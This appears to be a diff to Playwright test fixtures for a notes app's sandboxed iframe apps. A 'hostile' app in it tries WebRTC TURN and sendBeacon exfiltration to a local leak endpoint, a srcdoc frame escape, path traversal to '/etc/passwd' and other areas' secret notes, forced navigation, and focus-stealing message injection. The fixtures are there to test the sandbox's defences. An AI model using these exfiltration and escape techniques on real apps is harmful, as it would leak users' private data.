@@ -1,5 +1,6 @@
 import { readFileSync } from 'node:fs';
 import { expect, type Page } from '@playwright/test';
+import { defaultNeeds, hashNeeds } from '../../src/interface/manifest.ts';
 
 const seed = (name: string) => readFileSync(new URL(`../../areas-seed/${name}.html`, import.meta.url), 'utf8');
 
@@ -30,26 +31,47 @@ export const hostileApp = (ports: Ports) => `<!doctype html><html><body><pre id=
   for (const rel of ['dns-prefetch', 'preconnect', 'prefetch', 'prerender']) { const l = document.createElement('link'); l.rel = rel; l.href = LEAK.replace('/leak', '') + '/' + rel; document.head.appendChild(l); }
   await attempt('beacon', () => { if (!navigator.sendBeacon(LEAK + '?beacon', 'x')) throw new Error('refused'); return 'queued'; });
   R.rtc = typeof RTCPeerConnection === 'undefined' && typeof webkitRTCPeerConnection === 'undefined' ? 'blocked:absent' : 'present';
-  await attempt('rtcNew', () => { const pc = new RTCPeerConnection({ iceServers: [{ urls: TURN, username: 'SECRETUSER', credential: 'x' }] }); pc.createDataChannel('x'); return pc.createOffer().then((o) => pc.setLocalDescription(o)).then(() => 'offered'); });
-  await new Promise((r) => setTimeout(r, 1200));
+  await attempt('rtcNew', () => { const pc = new RTCPeerConnection({ iceServers: [{ urls: TURN, username: 'SECRETUSER', credential: 'x' }] }); pc.createDataChannel('x'); return pc.createOffer().then((o) => pc.setLocalDescription(o)).then(() => 'constructed'); });
+  // A srcdoc child frame is a fresh realm: the in-frame neutraliser never ran there. This is the review-2 P1-A escape.
+  const kid = document.createElement('iframe');
+  kid.srcdoc = '<script>try{var pc=new RTCPeerConnection({iceServers:[{urls:' + JSON.stringify(TURN) + ',username:"AARONS-PRIVATE-ROOM-MESSAGE",credential:"x"}]});pc.createDataChannel("x");pc.createOffer().then(function(o){return pc.setLocalDescription(o)})}catch(e){}<\/script>';
+  document.body.appendChild(kid);
+  await new Promise((r) => setTimeout(r, 1500));
 
   const replies = {};
-  addEventListener('message', (e) => { const m = e.data; if (m && m.bridge === 1 && m.id) (replies[m.id] = replies[m.id] || []).push(m); });
+  addEventListener('message', (e) => { const m = e.data; if (m && (m.uni === 1 || m.pfr === 1) && m.id) (replies[m.id] = replies[m.id] || []).push(m); });
   const send = (m) => parent.postMessage(m, '*');
   const wait = (ms) => new Promise((r) => setTimeout(r, ms));
-  send({ bridge: 1, id: 'unk', method: 'fs.read', params: { path: '/etc/passwd' } });
-  send({ bridge: 1, id: 'big', method: 'channel.compose', params: { text: 'x'.repeat(9000) } });
-  send({ bridge: 1, id: 'out1', method: 'note.get', params: { path: 'Areas/Atlas/Secret' } });
-  send({ bridge: 1, id: 'out2', method: 'note.get', params: { path: 'Areas/Hostile/../Atlas/Secret' } });
-  send({ bridge: 1, id: 'out3', method: 'note.get', params: { path: '/etc/passwd' } });
-  send({ bridge: 1, id: 'extra', method: 'area.get', params: {}, sneaky: true });
-  send('garbage'); send(null); send({ bridge: 1 }); send({ bridge: 1, id: 'z'.repeat(100), method: 'area.get' }); send({ bridge: 2, id: 'v2', method: 'area.get' });
-  await wait(600);
-  const first = (id) => (replies[id] || []).map((m) => m.error || 'result').join(',') || 'none';
-  for (const id of ['unk', 'big', 'out1', 'out2', 'out3', 'extra', 'v2']) R['bridge:' + id] = first(id);
-  R['bridge:longid'] = Object.keys(replies).some((k) => k.length > 64) ? 'replied' : 'none';
-  R.stray = Object.keys(replies).filter((k) => !['unk', 'big', 'out1', 'out2', 'out3', 'extra', 'v2'].includes(k)).join(',') || 'none';
-  for (let i = 0; i < 100; i++) send({ bridge: 1, id: 'f' + i, method: 'area.get' });
+  const U = (id, ns, method, params, extra) => send({ uni: 1, id, ns, method, params, ...(extra || {}) });
+  const F = (id, path, method) => send({ pfr: 1, channel: 'vault', id, method: method || 'GET', path, headers: {}, body: null });
+  U('unk', 'fs', 'read', { path: '/etc/passwd' });
+  U('unm', 'vault', 'constructor', {});
+  U('big', 'chat', 'draft', { text: 'x'.repeat(9000) });
+  U('room', 'chat', 'draft', { text: 'to a private room', room: 'uni-room' });
+  U('out1', 'note', 'open', { ref: 'Areas/Atlas/Secret' });
+  U('out2', 'note', 'open', { ref: 'Areas/Hostile/../Atlas/Secret' });
+  U('out3', 'note', 'open', { ref: '/etc/passwd' });
+  U('extra', 'theme', 'get', {}, { sneaky: true });
+  F('v1', '/api/notes/' + encodeURIComponent('Areas/Atlas/Secret'));
+  F('v2', '/api/notes?path_prefix=' + encodeURIComponent('Areas/Atlas/'));
+  F('v3', '/api/notes?id=n-secret&include_content=true');
+  F('v4', '/api/notes?search=ATLAS');
+  F('v5', '/api/notes?path_prefix=' + encodeURIComponent('Areas/Hostile/../Atlas/'));
+  F('v6', '/api/notes', 'POST');
+  F('v7', '/api/notes/' + encodeURIComponent('Areas/Hostile/Own'));
+  send('garbage'); send(null); send({ uni: 1 }); send({ uni: 1, id: 'z'.repeat(100), ns: 'theme', method: 'get' }); send({ uni: 2, id: 'ver', ns: 'theme', method: 'get' });
+  await wait(700);
+  const first = (id) => (replies[id] || []).map((m) => (m.error && m.error.code) || (m.pfr ? 'http' + m.status : 'result')).join(',') || 'none';
+  const known = ['unk', 'unm', 'big', 'room', 'out1', 'out2', 'out3', 'extra', 'v1', 'v2', 'v3', 'v4', 'v5', 'v6', 'v7', 'ver'];
+  for (const id of known) R['c:' + id] = first(id);
+  R.vaultBodies = known.filter((k) => k[0] === 'v' && k.length === 2).map((k) => (replies[k] || []).map((m) => m.body || '').join('')).join('|');
+  R['c:longid'] = Object.keys(replies).some((k) => k.length > 64) ? 'replied' : 'none';
+  R.stray = Object.keys(replies).filter((k) => !known.includes(k)).join(',') || 'none';
+  // Suggestion flood: only a few can be pending; none acts.
+  for (let i = 0; i < 6; i++) U('s' + i, 'chat', 'draft', { text: 'suggestion ' + i });
+  await wait(500);
+  R.suggest = JSON.stringify([0, 1, 2, 3, 4, 5].map((i) => first('s' + i)));
+  for (let i = 0; i < 100; i++) U('f' + i, 'theme', 'get', {});
   await wait(1200);
   let okN = 0, errN = 0, other = 0;
   for (let i = 0; i < 100; i++) { const m = (replies['f' + i] || [])[0]; if (!m) other++; else if ('error' in m) errN++; else okN++; }
@@ -58,37 +80,46 @@ export const hostileApp = (ports: Ports) => `<!doctype html><html><body><pre id=
 })();
 </script></body></html>`;
 
-export const BENIGN = `<!doctype html><html><body style="font-family:var(--sans)"><h1 id="t">…</h1><p id="n">…</p><p id="th">…</p><script>
-const call = (method, params) => new Promise((res, rej) => { const id = 'b' + Math.random(); const on = (e) => { const m = e.data; if (m && m.id === id) { removeEventListener('message', on); 'error' in m ? rej(new Error(m.error)) : res(m.result); } }; addEventListener('message', on); parent.postMessage({ bridge: 1, id, method, params }, '*'); });
-addEventListener('message', (e) => { if (e.data && e.data.event === 'theme') { document.getElementById('th').textContent = 'accent=' + e.data.data.accent; } });
-call('area.get').then((a) => { document.getElementById('t').textContent = a.title; });
-call('notes.list', { limit: 5 }).then((r) => { document.getElementById('n').textContent = r.notes.map((x) => x.title).join('|'); });
+export const BENIGN = `<!doctype html><html><body style="font-family:var(--sans)"><h1 id="t">…</h1><p id="n">…</p><p id="th">…</p><p id="c">…</p><a id="jump" href="#section">Jump</a><h2 id="section">Section</h2><script>
+uni.ready().then((ctx) => { document.getElementById('t').textContent = ctx.area.title; });
+uni.theme.on((t) => { document.getElementById('th').textContent = 'accent=' + t.accent; });
+uni.vault.queryNotes({ pathPrefix: 'Areas/Benign/', limit: 5 }).then((r) => { document.getElementById('n').textContent = r.map((x) => x.path.split('/').pop()).join('|'); });
+uni.chat.recent(3).then((r) => { document.getElementById('c').textContent = 'msgs=' + r.messages.length; });
 </script></body></html>`;
 
 // A late navigation (after the frame loaded), one per vector. The listener must never see it.
-export const navApp = (vector: 'self' | 'meta' | 'anchor' | 'write', ports: Ports) => {
+export const navApp = (vector: 'self' | 'meta' | 'anchor' | 'write' | 'parse', ports: Ports) => {
   const url = `http://127.0.0.1:${ports.http}/leak?nav=${vector}`;
   const code = {
     self: `location.href = ${JSON.stringify(url)};`,
     meta: `const m = document.createElement('meta'); m.httpEquiv = 'refresh'; m.content = '0;url=${url}'; document.head.appendChild(m);`,
     anchor: `const a = document.createElement('a'); a.href = ${JSON.stringify(url)}; document.body.appendChild(a); a.click();`,
     write: `document.open(); document.write('<meta http-equiv="refresh" content="0;url=${url}">'); document.close();`,
+    parse: `location.href = ${JSON.stringify(url)};`,
   }[vector];
+  // Navigating while the page is still parsing: no `load` ever follows, so a load counter can't see it.
+  if (vector === 'parse') return `<!doctype html><html><body><p>nav parse</p><script>${code}</script></body></html>`;
   return `<!doctype html><html><body><p>nav ${vector}</p><script>addEventListener('load', () => setTimeout(() => { ${code} }, 150));</script></body></html>`;
 };
 
-// Calls the two gated methods on load (must be refused), then on every click (first allowed, then throttled).
-export const GESTURE = `<!doctype html><html><body><button id="go">go</button><button id="open">open</button><pre id="out">{}</pre><script>
+// Asks for a draft and a note on load (no user action): both must only become pending suggestions.
+export const SUGGEST = `<!doctype html><html><body><button id="go">go</button><button id="open">open</button><pre id="out">{}</pre><script>
 const R = {};
 const show = () => { document.getElementById('out').textContent = JSON.stringify(R); };
-const call = (method, params) => new Promise((res) => { const id = 'g' + Math.random(); const on = (e) => { const m = e.data; if (m && m.id === id) { removeEventListener('message', on); res('error' in m ? { error: m.error } : { result: m.result }); } }; addEventListener('message', on); parent.postMessage({ bridge: 1, id, method, params }, '*'); });
+const call = (p) => p.then((r) => ({ result: r }), (e) => ({ error: e.code || e.message }));
 (async () => {
-  R.loadCompose = await call('channel.compose', { text: 'on load' });
-  R.loadOpen = await call('note.open', { ref: 'Areas/Gesture/Alpha' });
+  R.loadDraft = await call(uni.chat.draft('drafted on load'));
+  R.loadOpen = await call(uni.note.open('Areas/Suggest/Alpha'));
   show();
 })();
-document.getElementById('go').onclick = async () => { R.click1 = await call('channel.compose', { text: 'from click' }); R.click2 = await call('channel.compose', { text: 'again' }); show(); };
-document.getElementById('open').onclick = async () => { R.outOfScope = await call('note.open', { ref: 'Journal/2026/10/secret' }); show(); };
+document.getElementById('go').onclick = async () => { R.click = await call(uni.chat.draft('from click')); show(); };
+document.getElementById('open').onclick = async () => { R.outOfScope = await call(uni.note.open('Journal/2026/10/secret')); show(); };
+</script></body></html>`;
+
+// Review 2 P2-C: steal focus and keep asking, so any gesture heuristic would see "user is in the frame".
+export const FOCUS_STEAL = `<!doctype html><html><body><input id="i"><script>
+setInterval(() => { document.getElementById('i').focus(); window.focus(); }, 50);
+setInterval(() => { uni.chat.draft('INJECTED BY APP ' + Date.now()).catch(() => {}); uni.note.open('Areas/Steal/Alpha').catch(() => {}); }, 400);
 </script></body></html>`;
 
 type Variant = 'seed' | 'test';
@@ -96,8 +127,15 @@ type Variant = 'seed' | 'test';
 export type BootOpts = {
   selftest?: boolean; ipcLeak?: boolean;
   ports?: Ports;
-  /** Extra area apps (an `area` note plus an html `app` note each). */
-  apps?: { name: string; html: string }[];
+  /** Extra area apps (an `area` note plus an html `app` note each). `interface` is the manifest in the app note's metadata. */
+  apps?: { name: string; html: string; interface?: unknown }[];
+  /**
+   * 'off' (default) simulates a webview without WebRTC (WebKitGTK's default): no frame, child frames included, has RTCPeerConnection.
+   * 'native' leaves the real browser's WebRTC in place (Chromium has it).
+   */
+  webrtc?: 'off' | 'native';
+  /** Pre-grant every app's default needs (default true). False shows the grant prompt. */
+  granted?: boolean;
   /** Test-only seam: the self-test frames get no CSP meta (needs the VITE_AREAS_TESTHOOKS build). */
   stripCsp?: boolean;
   /** Serve the host document without the Tauri CSP header. */
@@ -112,7 +150,7 @@ export async function bootAreas(page: Page, variant: Variant = 'seed', opts: Boo
   const now = Math.floor(Date.now() / 1000);
   const data = {
     now, variant, selftest: opts.selftest ?? true, ipcLeak: opts.ipcLeak ?? false, hostile: hostileApp(opts.ports ?? { http: 9, udp: 9 }), benign: BENIGN, techne: seed('techne'), unforced: seed('unforced'),
-    apps: opts.apps ?? [], stripCsp: !!opts.stripCsp, versionFails: !!opts.versionFails, passUa: opts.passUa ?? null,
+    apps: opts.apps ?? [], granted: opts.granted ?? true, webrtcOff: (opts.webrtc ?? 'off') === 'off', defaultHash: hashNeeds(defaultNeeds()), stripCsp: !!opts.stripCsp, versionFails: !!opts.versionFails, passUa: opts.passUa ?? null,
   };
   if (opts.noHostCsp) {
     await page.route((u) => new URL(u).pathname === '/', async (route) => {
@@ -126,12 +164,18 @@ export async function bootAreas(page: Page, variant: Variant = 'seed', opts: Boo
     // Simulates a webview that delivers IPC into every frame (wry/WebKitGTK or Android).
     if (d.ipcLeak) (window as any).ipc = { postMessage: () => {} };
     if (d.stripCsp) (window as any).__areasTest = { stripCsp: true };
+    // Runs in every frame, srcdoc children included, before their scripts.
+    if (d.webrtcOff) for (const n of ['RTCPeerConnection', 'webkitRTCPeerConnection', 'mozRTCPeerConnection', 'RTCDataChannel', 'RTCSessionDescription', 'RTCIceCandidate']) { try { Object.defineProperty(window, n, { value: undefined, configurable: true, writable: false }); } catch { /* already defined */ } }
     // Tauri injects its internals into the main frame only (for_main_frame_only: true), so sandboxed frames never get them.
     if (window.top !== window) return;
     const w = window as any;
     w.__calls = [];
     // The live-frame gate opens for this platform and version through a stored self-test pass.
     if (d.selftest && !localStorage.getItem('uni.areaApps.selftest.v1')) localStorage.setItem('uni.areaApps.selftest.v1', JSON.stringify({ platform: 'linux', passedAt: '2026-10-08T00:00:00Z', appVersion: 'dev', userAgent: d.passUa ?? navigator.userAgent }));
+    if (d.granted && !localStorage.getItem('uni.interface.grants.v1')) {
+      const ids = ['app-techne', 'app-unf', 'app-host', 'app-ben', ...(d.apps as { name: string }[]).map((a) => 'app-x-' + a.name)];
+      localStorage.setItem('uni.interface.grants.v1', JSON.stringify(Object.fromEntries(ids.map((id) => [id, { hash: d.defaultHash, grantedAt: '2026-10-08T00:00:00Z' }]))));
+    }
     const U = 'a'.repeat(64);
     const area = (id: string, name: string, status: string, ch: string, purpose: string) => ({
       id, path: `Areas/${name}`, extension: 'md', tags: ['area'], updatedAt: '2026-10-07T12:00:00Z', createdAt: '2026-09-01T00:00:00Z',
@@ -164,7 +208,7 @@ export async function bootAreas(page: Page, variant: Variant = 'seed', opts: Boo
       );
     }
     for (const a of d.apps as { name: string; html: string }[]) {
-      notes.push(area('a-x-' + a.name, a.name, 'foreground', 'ch-techne', `An area whose app is ${a.name}.`), { id: 'app-x-' + a.name, path: `Areas/${a.name}/app`, extension: 'html', content: a.html, updatedAt: '2026-10-07T00:00:00Z' },
+      notes.push(area('a-x-' + a.name, a.name, 'foreground', 'ch-techne', `An area whose app is ${a.name}.`), { id: 'app-x-' + a.name, path: `Areas/${a.name}/app`, extension: 'html', content: a.html, ...(a.interface ? { metadata: { interface: a.interface } } : {}), updatedAt: '2026-10-07T00:00:00Z' },
         { id: 'n-x-' + a.name, path: `Areas/${a.name}/Alpha`, extension: 'md', content: '# Alpha', updatedAt: '2026-10-07T00:00:00Z' });
     }
     const msg = (ref: string, channel: string, name: string, ago: number, body: string) => ({ ref, channel, author: name === 'Aaron' ? U : 'b'.repeat(64), author_name: name, ts: d.now - ago, body, mentions_me: false, root: null, parent: null, mentions: [], reply_count: 0, last_reply_ts: null, edited: false, reactions: [] });
@@ -197,7 +241,8 @@ export async function bootAreas(page: Page, variant: Variant = 'seed', opts: Boo
             return { hub: 'https://example.invalid', vault: 'uni', note: { createdAt: '2026-09-01T00:00:00Z', tags: [], metadata: {}, ...n } };
           }
           case 'journal_config': return { hub: 'https://example.invalid', vault: 'uni' };
-          case 'journal_pending': case 'journal_list': case 'search_messages': case 'vault_search': return [];
+          case 'vault_search': return notes.filter((n) => (n.content ?? '').toLowerCase().includes(String(args.query).toLowerCase()) && (!args.pathPrefix || (n.path ?? '').startsWith(args.pathPrefix))).slice(0, args.limit ?? 20).map((n) => ({ vault: 'uni', id: n.id, path: n.path, snippet: String(n.content).slice(0, 60), score: null, mode: 'keyword' }));
+          case 'journal_pending': case 'journal_list': case 'search_messages': return [];
           case 'journal_flush': return { sent: [], remaining: 0, error: null };
           case 'refresh': return { pubkey: U, total_items: 0, channel_errors: {}, truncated_channels: [] };
           default: return null;
